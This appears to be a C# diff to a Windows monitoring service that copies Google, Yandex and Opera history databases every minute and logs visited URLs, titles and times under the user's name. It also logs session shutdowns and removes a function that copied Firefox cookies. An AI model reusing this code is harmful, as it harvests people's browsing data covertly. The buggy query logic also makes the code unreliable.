@@ -14,6 +14,7 @@ using WindowsMonitorService;
 using System.Collections.ObjectModel;
 using System.Collections;
 using System.Management;
+using Microsoft.Win32;
 
 namespace FileWatcherService
 {
@@ -30,8 +31,19 @@ namespace FileWatcherService
             this.CanStop = true;
             this.CanPauseAndContinue = true;
             this.AutoLog = true;
-
+            SystemEvents.SessionEnded += new SessionEndedEventHandler(SystemEvents_EventsThreadShutdown);
             this.CanHandleSessionChangeEvent = true;
+        }
+
+        private void SystemEvents_EventsThreadShutdown(object sender, SessionEndedEventArgs e)
+        {
+            using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
+            {
+                
+                    writer.WriteLine($"Выключил комп {this.UserName}!");
+
+
+            }
         }
 
         protected override void OnSessionChange(SessionChangeDescription obj)
@@ -39,6 +51,7 @@ namespace FileWatcherService
             GetUserName();
         }
 
+         
         private void GetUserName()
         {
             object obj = new object();
@@ -68,7 +81,7 @@ namespace FileWatcherService
         {
             GetUserName();
             logger = new Logger(UserName);
-            logger.RecordEntry("Служба запущенна!");
+            logger.RecordEntry("Служба запущенна!", false);
             Thread loggerThread = new Thread(new ThreadStart(logger.Start));
             loggerThread.Start();
         }
@@ -97,7 +110,7 @@ namespace FileWatcherService
         /// <summary>
         /// Копирование файла истории Opera
         /// </summary>
-        private void readHistoryOpera()
+        private void copyHistoryOpera()
         {
             try
             {
@@ -133,52 +146,6 @@ namespace FileWatcherService
                 RecordEntry(ex.Message);
             }
         }
-
-
-
-
-        /// <summary>
-        /// Копирование файла истории Firefox
-        /// </summary>
-        private void readHistoryFirefox()
-        {
-            try
-            {
-                string firefox = String.Empty;
-
-                foreach (var item in Directory.GetFiles($@"{Directory.GetDirectories($@"C:\Users\{UserName}\AppData\Roaming\Mozilla\Firefox\Profiles")[0]}\"))
-                {
-
-                    if (Path.GetFileName(item.ToLower()).ToString().Equals("cookies.sqlite"))
-                    {
-                        firefox = Path.GetFullPath(item);
-
-                    }
-                }
-
-                using (FileStream ms = new FileStream(firefox, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
-                {
-                    ms.Seek(0, SeekOrigin.Begin);
-                    byte[] buffer = new byte[ms.Length];
-                    int len;
-                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-
-                    }
-
-                    File.WriteAllBytes("D:\\historyFirefox.sqlite", buffer);
-                    //readHistory();
-                }
-
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-        }
-
-
-
 
         /// <summary>
         /// Копирование файла истории Yandex
@@ -282,10 +249,13 @@ namespace FileWatcherService
                 try
                 {
                     Thread.Sleep(60000);
-                    //copyHistoryGoogle();
+                    copyHistoryGoogle();
+                    ReadGoogleDataBase();
                     copyHistoryYandex();
                     ReadYandexDataBase();
-                    //ReadGoogleDataBase();
+                    copyHistoryOpera();
+                    ReadOperaDataBase();
+
                     GC.Collect();
                 }
                 catch (Exception d)
@@ -295,8 +265,8 @@ namespace FileWatcherService
                 }
 
                 
-                //readHistoryFirefox();
-                //readHistoryOpera();
+                
+                
 
 
             }
@@ -464,6 +434,91 @@ namespace FileWatcherService
             }
         }
 
+
+
+        const string OperadatabaseName = @"D:\\historyOpera.db";
+        private void ReadOperaDataBase()
+        {
+            try
+            {
+
+                if (File.Exists(OperadatabaseName))
+                {
+
+                    string lastTime = null;
+                    string tmpPath = "D:\\tmpOpera.txt";
+                    if (lastTime == null)
+                        lastTime = DateTime.Now.ToString();
+                    if (File.Exists(tmpPath))
+                    {
+
+                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
+                        {
+                            // преобразуем строку в байты
+                            byte[] array = new byte[f.Length];
+                            // считываем данные
+                            f.Read(array, 0, array.Length);
+                            // декодируем байты в строку
+                            lastTime = Encoding.Default.GetString(array);
+
+                        }
+                    }
+
+                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={OperadatabaseName};")))
+                    {
+
+                        connection.Open();
+                        StringBuilder stringBuilder = new StringBuilder();
+
+                        DbDataReader r = null;
+
+                        if (DateTime.Parse(lastTime) < DateTime.Now)
+                        {
+
+                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
+
+                        }
+                        else
+                        {
+
+                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
+                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
+                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
+
+                        }
+                        if (r.HasRows)
+                        {
+
+                            while (r.Read())
+                            {
+                                stringBuilder.Append("title:\t");
+                                stringBuilder.Append(r.GetValue(2));
+                                stringBuilder.Append("\turl:\t");
+                                stringBuilder.Append(r.GetValue(1));
+                                stringBuilder.Append("\tlast time:\t");
+                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
+                                stringBuilder.Append("\r\n\r");
+                            }
+                        }
+
+                        RecordEntry(stringBuilder.ToString());
+
+                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
+                        {
+                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                RecordEntry(ex.Message);
+            }
+        }
+
+
+
+
         public void Stop()
         {
 
@@ -471,14 +526,14 @@ namespace FileWatcherService
         }
 
 
-        public void RecordEntry(string fileEvent)
+        public void RecordEntry(string fileEvent, bool isError  = true)
         {
             lock (obj)
             {
                 using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                 {
-                    writer.WriteLine(String.Format("{0} под пользователем {1} произошла ошибка {2}",
-                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, fileEvent));
+                    writer.WriteLine(String.Format("{0} под пользователем {1} {2}{3}",
+                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, isError == true ? " произошла ошибка ": "", fileEvent));
                     writer.Flush();
                 }
             }
